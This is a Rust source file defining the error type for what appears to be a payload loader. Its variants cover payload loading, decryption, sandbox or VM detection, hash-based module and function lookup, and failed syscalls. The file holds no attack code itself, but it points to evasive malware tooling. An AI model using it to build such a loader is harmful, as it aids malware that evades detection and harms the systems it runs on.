#[derive(Debug)]
pub enum RslError {
    NtStatus(i32),
    IoError(std::io::Error),
    HttpError(String),
    PayloadLoadError(String),
    DecryptionError(String),
    SandboxDetected,
    ModuleNotFound(u32),
    FunctionNotFound(u32),
    SyscallFailed(u32),
    Other(String),
}

impl std::fmt::Display for RslError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            RslError::NtStatus(status) => write!(f, "NTSTATUS: 0x{:08X}", status),
            RslError::IoError(e) => write!(f, "IO Error: {}", e),
            RslError::HttpError(e) => write!(f, "HTTP Error: {}", e),
            RslError::PayloadLoadError(e) => write!(f, "Payload Load Error: {}", e),
            RslError::DecryptionError(e) => write!(f, "Decryption Error: {}", e),
            RslError::SandboxDetected => write!(f, "Sandbox/VM detected"),
            RslError::ModuleNotFound(hash) => write!(f, "Module not found (hash: 0x{:08X})", hash),
            RslError::FunctionNotFound(hash) => {
                write!(f, "Function not found (hash: 0x{:08X})", hash)
            }
            RslError::SyscallFailed(hash) => write!(f, "Syscall failed (hash: 0x{:08X})", hash),
            RslError::Other(e) => write!(f, "Error: {}", e),
        }
    }
}
impl From<RslError> for String {
    fn from(err: RslError) -> Self {
        format!("{}", err)
    }
}
impl std::error::Error for RslError {}

impl From<&str> for RslError {
    fn from(s: &str) -> Self {
        RslError::Other(s.to_string())
    }
}

impl From<String> for RslError {
    fn from(s: String) -> Self {
        RslError::Other(s)
    }
}

pub type RslResult<T> = Result<T, RslError>;
